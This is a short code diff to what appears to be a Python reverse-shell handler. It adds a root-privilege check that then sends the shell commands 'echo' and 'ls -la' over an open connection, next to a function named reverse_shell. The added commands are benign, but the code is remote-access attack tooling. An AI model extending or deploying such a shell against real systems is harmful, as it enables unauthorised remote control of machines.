@@ -169,6 +169,12 @@ def handle_connection(conn):
         sys.stdout.write(data.decode())
         sys.stdout.flush()
 
+        # Check if the user has root access
+        if os.geteuid() == 0:
+            # If so, run some commands
+            conn.send("echo 'Hello, root user!'\n".encode())
+            conn.send("ls -la\n".encode())
+
     conn.close()
     
 def reverse_shell():
